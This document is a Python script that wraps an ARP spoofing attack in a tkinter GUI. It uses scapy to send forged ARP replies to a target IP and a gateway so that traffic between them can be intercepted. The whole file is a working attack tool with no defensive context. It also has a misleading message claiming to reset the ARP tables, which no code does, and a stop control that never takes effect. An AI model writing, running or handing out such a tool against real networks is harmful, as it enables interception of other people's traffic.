import tkinter as tk
import socket
import sys
import time
import scapy.all as sc

def arp_spoofing_main(root):
    # ARP Spoofing GUI and logic...
    arp_spoof_process = None  # Global variable to hold the ARP spoofing process

    def open_arp_spoofing_window():
        nonlocal arp_spoof_process

        arp_window = tk.Toplevel(root)
        arp_window.title("ARP Spoofing")
        arp_window.geometry("480x350")

        def spoof_arp(output_text):
            nonlocal arp_spoof_process
            target_ip = target_entry.get()
            gateway_ip = gateway_entry.get()
            try:
                while True:
                    spoof(target_ip, gateway_ip, output_text)
                    spoof(gateway_ip, target_ip, output_text)
                    time.sleep(2)
                    output_text.insert(tk.END, "[+] Packets sent\n")
                    output_text.see(tk.END)
                    if arp_spoof_process is None:
                        break
            except KeyboardInterrupt:
                output_text.insert(tk.END, "\n[+] Detected CTRL + C ... Resetting ARP tables ... Please wait.\n")
                output_text.see(tk.END)
                sys.exit(0)

        def stop_spoofing():
            nonlocal arp_spoof_process
            arp_spoof_process = None

        target_label = tk.Label(arp_window, text="Target IP Address (example: 192.168.1.14):")
        target_label.grid(row=0, column=0, padx=10, pady=5)
        target_entry = tk.Entry(arp_window)
        target_entry.grid(row=0, column=1, padx=10, pady=5)

        gateway_label = tk.Label(arp_window, text="Gateway IP Address (example: 192.168.1.254):")
        gateway_label.grid(row=1, column=0, padx=10, pady=5)
        gateway_entry = tk.Entry(arp_window)
        gateway_entry.grid(row=1, column=1, padx=10, pady=5)

        output_text = tk.Text(arp_window, height=10, width=55)
        output_text.grid(row=2, column=0, columnspan=2, padx=10, pady=5)

        spoof_button = tk.Button(arp_window, text="Start ARP Spoofing", command=lambda: spoof_arp(output_text))
        spoof_button.grid(row=3, column=0, columnspan=2, pady=10)

        exit_button = tk.Button(arp_window, text="Stop", command=stop_spoofing)
        exit_button.grid(row=4, column=0, columnspan=2, pady=10)

    def spoof(target_ip, spoof_ip, output_text):
        target_mac = get_mac(target_ip)
        if target_mac:
            packet = sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            sc.send(packet, verbose=False)
        else:
            output_text.insert(tk.END, f"[-] Failed to get target MAC address for {target_ip}\n")
            output_text.see(tk.END)

    def get_mac(ip):
        arp_packet = sc.ARP(pdst=ip)
        broadcast_packet = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_broadcast_packet = broadcast_packet/arp_packet
        answered_list = sc.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
        else:
            return None

    open_arp_spoofing_window()